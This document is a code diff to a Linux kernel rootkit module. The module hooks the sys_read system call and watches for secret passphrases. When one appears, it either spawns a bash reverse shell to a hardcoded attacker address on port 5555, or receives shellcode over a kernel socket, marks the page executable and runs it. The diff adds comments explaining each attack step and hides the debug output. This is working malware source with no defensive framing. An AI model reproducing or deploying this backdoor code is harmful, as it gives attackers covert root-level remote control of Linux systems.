@@ -1,6 +1,6 @@
 /*
  * Writting by Sander Demeester
- * Based on code from E.B
+ * Based on code from E.B (memory pattern scanning).
  */
 
 #include <linux/kernel.h>
@@ -23,13 +23,13 @@
 
 #include <net/sock.h>
 
-
 #define __NR_READ 3
 #define INADDRSZ 4
 #define SERVER_PORT 5555
 #define ATTACK_SERVER "192.168.1.18"
 #define SECRET_PASSPHRASE1 "a good day to die hard"
-#define SECRET_PASSPHRASE2 "callme"
+#define SECRET_PASSPHRASE2 "trust me"
+#define BASH_EXECUTE "/bin/bash -i >& /dev/tcp/192.168.1.18/5555 0>&1"
 
 MODULE_LICENSE("GPL");
 
@@ -38,8 +38,10 @@ typedef asmlinkage long (*orig_read_t)(unsigned int fd, const char*buf, size_t c
 
 void hexdump(unsigned char *addr, unsigned int length);
 int inet_pton_pv(const char*src, unsigned char*dst);
-void backdoor(void*pt);
-void reverse_shell_backdoor(void*pt);
+
+void shellcode_execute_backdoor(void*pt);
+int reverse_shell_backdoor(void*pt);
+
 // Pointer to original sys_read call adres
 orig_read_t origin_syscall = NULL;
 
@@ -53,20 +55,26 @@ int kthread_status;
 int check = 0;
 
 // kthread status
-int thread_status = 0;
+struct task_struct *thread_status = NULL;
 
 // Hooked syscall 
 asmlinkage ssize_t evil_sys_read(unsigned int fd, char *buf, size_t count){
   ssize_t return_value = (*origin_syscall)(fd, buf, count);
 
   if(strstr(buf, SECRET_PASSPHRASE1) != NULL && !check){
+    #ifdef DEBUG
     printk("%s \n",buf);
-    /* check = 1; */
-    /* thread_status = kthread_run(backdoor, NULL, "backdoor thread"); */
-  }else if(strstr(buf, SECRET_PASSPHRASE2) != NULL && !check){
-    printk("%s \n",buf);
+    #endif
+
     check = 1;
-    thread_status = kthread_run(reverse_shell_backdoor, NULL, "backdoor thread");
+    thread_status = kthread_run((void*)shellcode_execute_backdoor, NULL, "backdoor thread");
+  }else if(strstr(buf, SECRET_PASSPHRASE2) != NULL && !check){
+    #ifdef DEBUG
+    printk("%s \n",buf);
+    #endif
+
+    check = 1;     
+    thread_status = kthread_run((void*)reverse_shell_backdoor, NULL, "backdoor thread");
   }
   return return_value;
 }
@@ -160,6 +168,7 @@ void cleanup_module(){
     // protect page
     set_pte_atomic(pte, pte_clear_flags(*pte, _PAGE_RW));
     
+    // Check if thread is started.
     if(!thread_status) kthread_stop(thread_status);
   }
 }
@@ -183,6 +192,7 @@ void hexdump(unsigned char *addr, unsigned int length) {
   }
 }
 
+// Convert ip adr
 int inet_pton_pv(const char*src, unsigned char*dst){
   static const char digits[] = "0123456789";
   int saw_digit, octets, ch;
@@ -224,51 +234,65 @@ int inet_pton_pv(const char*src, unsigned char*dst){
   return (1);
 }
 
-void reverse_shell_backdoor(void*pt){
-
+int reverse_shell_backdoor(void*pt){
+  
+  #ifdef DEBUG
   printk("reverse shell backdoor\n");
+  #endif
+
+  // Define subprocess struct
   struct subprocess_info *sub_info;
-  char *argv[] = { "/bin/bash","-c","/bin/bash -i >& /dev/tcp/192.168.1.18/5555 0>&1", NULL };
+  char *argv[] = { "/bin/bash","-c",BASH_EXECUTE, NULL };
+
   static char *envp[] = {
     "HOME=/",
     "TERM=linux",
     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
   
+  // Start kernel thread in userspace.
   sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
   if (sub_info == NULL) return -ENOMEM;
   
-  call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
+  return call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );
 }
-void backdoor(void*pt){
+
+void shellcode_execute_backdoor(void*pt){
+
+  #ifdef DEBUG
+  printk("reverse shell backdoor\n");
+  #endif
+
+  // Define socket handling in kernel.
   struct sockaddr_in server_addr;
   struct socket *sk = NULL;
 
   char buffer[1000];
+  // We define buffer space for our shellcode in kernelspace. 
+  // We need to fix adrespace mismatch.
   mm_segment_t old_fs = get_fs();
   
-  int pagesize = 4096;
   int ret = -1;
+  pte_t *pte;
+  
+  // Message header from out network payload.
+  struct msghdr msg;
 
-  printk("setup backdoor\n");
+  // Data storage structure for IO using uIO.
+  struct iovec iov;
+
   ret = sock_create(AF_INET, SOCK_STREAM, 0, &sk);
   if(ret < 0) printk("sock_create failed\n");
-
   
-  printk("creating sockaddr_in\n");
   memset(&server_addr, 0, sizeof(server_addr));
   server_addr.sin_family = AF_INET;
+  
   server_addr.sin_port = htons(SERVER_PORT);
   inet_pton_pv(ATTACK_SERVER, &server_addr.sin_addr);
   
-  
-  printk("%d %d \n", server_addr.sin_family, 
-	 server_addr.sin_port);
+  // our socket contains operations based on the type "AF_INET".
   sk->ops->connect(sk, (struct sock_addr_in*)&server_addr, sizeof(server_addr), 0);  
   
-  // revc our payload
-  struct msghdr msg;
-  struct iovec iov;
-
+  // revc our payload, the base buffer is kernel memory (mm_segment_t);
   iov.iov_base = (void*) &buffer[0];
   iov.iov_len = (__kernel_size_t)1000;
 
@@ -279,14 +303,20 @@ void backdoor(void*pt){
   msg.msg_iovlen = 1;
   msg.msg_control = NULL;
   msg.msg_controllen = 0;  
-  
+
+  // Set back
   set_fs(KERNEL_DS);
 
+  // Receive 1000 byes
   ret = sock_recvmsg(sk, &msg, 1000, 0);
   set_fs(old_fs);
 
-  pte_t *pte = lookup_address(&buffer[0], &level);
+  // Get page memory adres (page table entry) that contains our buffer.
+  pte = lookup_address(&buffer[0], &level);
+
+  // Mark that memory page as executable !(NX).
   set_pte_atomic(pte, pte_mkexec(*pte));
-  printk("%x \n", buffer);
+
+  // Execute our buffer.
   ((void(*)())buffer)();
 }
